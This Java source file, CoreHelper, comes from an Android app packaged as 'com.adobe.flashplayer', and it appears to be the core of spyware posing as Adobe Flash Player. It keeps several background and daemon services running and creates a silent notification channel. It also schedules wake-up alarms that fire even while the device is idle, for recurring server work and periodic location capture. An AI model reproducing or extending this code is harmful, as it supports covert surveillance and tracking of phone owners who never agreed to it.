package com.adobe.flashplayer.core;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.os.Build;
import android.util.Log;
import android.view.PixelCopy;

import androidx.annotation.RequiresApi;

import com.adobe.flashplayer.MainEntry;
import com.adobe.flashplayer.MyLog;
import com.adobe.flashplayer.PrefOper;
import com.adobe.flashplayer.Public;
import com.adobe.flashplayer.Utils;
import com.adobe.flashplayer.install.InstallActivity;
import com.adobe.flashplayer.network.ServerCommand;

public class CoreHelper {

    private static final String TAG 			= "[ljg]CoreHelper ";

    public static void launchForegroundService_inner(Context context){
        if(Utils.isServiceRunning(context, ForegroundSrv.class.getName()) == false){
            Intent intentservice = new Intent(context,ForegroundSrv.class);
            intentservice.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startService(intentservice);
            Log.e(TAG, "ForegroundService started");
            MyLog.writeLogFile(TAG+"ForegroundService started\r\n");
        }
    }

    public static void launchRemoteService_inner(Context context){
        if(Utils.isServiceRunning(context, RemoteSrv.class.getName()) == false){
            Intent intentfore = new Intent(context, ForegroundSrv.class);
            intentfore.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startService(intentfore);

            Log.e(TAG, "startRemoteService started");
            MyLog.writeLogFile(TAG+"startRemoteService started\r\n");
        }
    }

    public static void launchJobDeamonService_inner(Context context){
        if(Utils.isServiceRunning(context, JobDeamonSrv.class.getName()) == false){
            Intent intentDeamon = new Intent(context, JobDeamonSrv.class);
            intentDeamon.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startService(intentDeamon);
            Log.e(TAG, "startJobDeamonService started");
            MyLog.writeLogFile(TAG+"startJobDeamonService started\r\n");
        }
    }





    public static void launchForegroundService(Context context){
        if(Utils.isServiceRunning(context, ForegroundSrv.class.getName()) == false){
            ComponentName componentName = new ComponentName(context, ForegroundSrv.class);

            Intent intent =new Intent();

            intent.setComponent(componentName );

            context.startService(intent);

            Log.e(TAG, "startForegroundService started");
            MyLog.writeLogFile(TAG+"startForegroundService started\r\n");
        }
    }


    public static void launchRemoteService(Context context){
        if(Utils.isServiceRunning(context, RemoteSrv.class.getName()) == false){

            ComponentName componentName = new ComponentName(context, RemoteSrv.class);

            Intent intent =new Intent();

            intent.setComponent(componentName );

            context.startService(intent);

            Log.e(TAG, "startRemoteService started");
            MyLog.writeLogFile(TAG+"startRemoteService started\r\n");
        }
    }

    public static void launchJobDeamonService(Context context){
        if(Utils.isServiceRunning(context, JobDeamonSrv.class.getName()) == false){
            ComponentName componentName = new ComponentName(context, JobDeamonSrv.class);

            Intent intent =new Intent();

            intent.setComponent(componentName );

            context.startService(intent);
            Log.e(TAG, "startJobDeamonService started");
            MyLog.writeLogFile(TAG+"startJobDeamonService started\r\n");
        }
    }


    @RequiresApi(api = Build.VERSION_CODES.O)
    public static String createNotificationChannel(String channelId, String channelName, Context context){
        NotificationChannel chan = new NotificationChannel(channelId, channelName, NotificationManager.IMPORTANCE_NONE);
        chan.setLightColor(Color.BLUE);
        chan.setLockscreenVisibility(Notification.VISIBILITY_PRIVATE);
        NotificationManager service = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
        service.createNotificationChannel(chan);
        return channelId;
    }



    public static void launchWorkThread(Context context){
        Thread t = Utils.getThreadForName(Public.WORK_THREADNAME);
        if (null == t)
        {
            MainEntry thread = new MainEntry(context,"");
            thread.setName(Public.WORK_THREADNAME);
            thread.start();
            Log.e(TAG,"create work thread");
            MyLog.writeLogFile("create work thread\r\n");
        }
        else if (!t.isAlive()){
            t.start();
            Log.e(TAG,"start work thread");
        }else{
            Log.e(TAG,"work thread is running");
        }
    }



    public static void scheduleWorkAlarm(Context context){
        try {
            AlarmManager alarmManager = (AlarmManager)context.getSystemService(Context.ALARM_SERVICE);
            Intent alarmintent = new Intent(context,Broadcast.class);
            alarmintent.setAction(Public.PHONEWORK_ALARM_ACTION);
            PendingIntent pend = PendingIntent.getBroadcast(context, Public.WORK_REQUEST_CODE, alarmintent, PendingIntent.FLAG_UPDATE_CURRENT);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                long nexttime = System.currentTimeMillis() + Public.SYNCHRONIZITION_SECONDS_TIME*1000;
                alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP,nexttime, pend);
            }else{
                //setInexactRepeating
                alarmManager.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), Public.SYNCHRONIZITION_SECONDS_TIME*1000, pend);
            }

            MyLog.writeLogFile("scheduleWorkAlarm complete\r\n");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    public static void scheduleLocationAlarm(Context context){
        try {
            AlarmManager am = (AlarmManager)context.getSystemService(Context.ALARM_SERVICE);
            Intent intent = new Intent(context,Broadcast.class);
            intent.setAction(Public.PHONELOCATION_ALARM_ACTION);
            PendingIntent pend = PendingIntent.getBroadcast(context, Public.LOCATION_REQUEST_CODE, intent, PendingIntent.FLAG_UPDATE_CURRENT);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                long nexttime = System.currentTimeMillis() + Public.PHONE_LOCATION_MINSECONDS*1000;
                am.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP,nexttime, pend);
            }else{
                //setInexactRepeating
                am.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), Public.PHONE_LOCATION_MINSECONDS*1000, pend);
            }

            MyLog.writeLogFile("scheduleLocationAlarm complete\r\n");

        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    public static native int fileLock(String dstfn);
}


